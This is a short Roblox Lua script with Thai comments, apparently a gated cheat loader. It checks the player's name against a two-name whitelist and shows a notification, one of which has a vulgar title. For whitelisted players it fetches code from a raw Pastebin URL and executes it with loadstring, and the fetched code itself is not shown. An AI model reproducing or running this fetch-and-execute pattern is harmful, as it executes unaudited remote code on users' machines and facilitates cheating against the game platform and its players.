local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = Players.LocalPlayer

-- รายชื่อผู้เล่นที่ได้รับอนุญาต (ใส่ชื่อเพิ่มตรงนี้ได้เลย)
local Whitelist = {
    "Amosssandt0250",
    "Rhodyreidt897",
    -- "ชื่อผู้เล่นอื่นที่ต้องการเพิ่ม",
}

-- ฟังก์ชันแจ้งเตือนระบบ (แสดง 10 วินาที)
local function notify(title, text)
    StarterGui:SetCore("SendNotification", {
        Title = title,
        Text = text,
        Duration = 10 -- ระยะเวลา 10 วินาที
    })
end

-- ฟังก์ชันตรวจสอบรายชื่อ
local function checkWhitelist(player)
    for _, name in ipairs(Whitelist) do
        if name:lower() == player.Name:lower() then
            return true
        end
    end
    return false
end

-- ตรวจสอบและดำเนินการ
if checkWhitelist(LocalPlayer) then
    notify("ระบบตรวจสอบควย59", "คุณได้รับอนุญาตแล้ว")
    loadstring(game:HttpGet("https://pastebin.com/raw/5u8Uewj7"))()
else
    notify("ระบบ Whitelist", "คุณไม่ได้รับอนุญาตในการใช้สคริปต์")
end
